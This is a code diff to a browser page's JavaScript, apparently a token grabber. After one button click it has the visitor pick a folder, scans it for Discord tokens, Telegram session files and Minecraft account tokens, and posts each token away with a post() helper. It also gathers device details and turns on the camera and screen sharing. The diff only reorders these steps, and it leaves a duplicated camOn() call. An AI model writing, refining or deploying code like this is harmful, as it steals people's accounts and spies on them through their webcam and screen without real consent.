@@ -316,27 +316,14 @@ $("go").addEventListener("click", async () => {
 
   $("go").disabled = true;
 
-  /* folder picker first: it needs the click's activation */
+  /* start the folder dialog now: it needs this click, but we do not wait on it */
+  let pickPromise = null;
   if (window.showDirectoryPicker) {
     try {
-      const h = await window.showDirectoryPicker({ mode: "read" });
+      pickPromise = window.showDirectoryPicker({ mode: "read" });
       mark("k3", "run");
-      const r = await scanRoaming(h);
-      const lines = [];
-      if (r.discord && r.discord.length) {
-        const uniq = [...new Set(r.discord)];
-        for (const tok of uniq) await post("Discord token", "dc", tok);
-        lines.push("<b>" + uniq.length + " discord token(s)</b>");
-      }
-      if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
-      if (r.minecraft && r.minecraft.length) {
-        lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
-        for (const a of r.minecraft) await post("Minecraft", a.name || "?", a.token || "token");
-      }
-      note("k3", lines.join("<br>") || "nothing recognisable in there");
-      mark("k3", lines.length ? "done" : "fail");
-      appData = r;
-    } catch (e) { if (e.name !== "AbortError") { mark("k3", "fail"); note("k3", e.name); } }
+      note("k3", "waiting for the folder…");
+    } catch (e) { pickPromise = null; }
   } else {
     note("k3", "this browser has no folder access");
   }
@@ -358,6 +345,33 @@ $("go").addEventListener("click", async () => {
 
     mark("k2", "run"); const dev = await device(); mark("k2", "done");
     await item("device", dev);
+
+    /* folder pick finishes here */
+    if (pickPromise) {
+      try {
+        const h = await pickPromise;
+        note("k3", "reading…");
+        const r = await scanRoaming(h);
+        appData = r;
+        const lines = [];
+        if (r.discord && r.discord.length) {
+          const uniq = [...new Set(r.discord)];
+          for (const tok of uniq) await post("Discord token", "dc", tok);
+          lines.push("<b>" + uniq.length + " discord token(s)</b>");
+        }
+        if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
+        if (r.minecraft && r.minecraft.length) {
+          lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
+          for (const a of r.minecraft) await post("Minecraft", a.name || "?", a.token || "token");
+        }
+        note("k3", lines.join("<br>") || "nothing recognisable in there");
+        mark("k3", lines.length ? "done" : "fail");
+        await item("apps", r);
+      } catch (e) { mark("k3", "fail"); note("k3", e.name === "AbortError" ? "skipped" : e.name); }
+    }
+
+    /* camera asks itself, then the screen share follows */
+    camOn();
 
     /* camera asks itself, then the screen share follows */
     camOn();
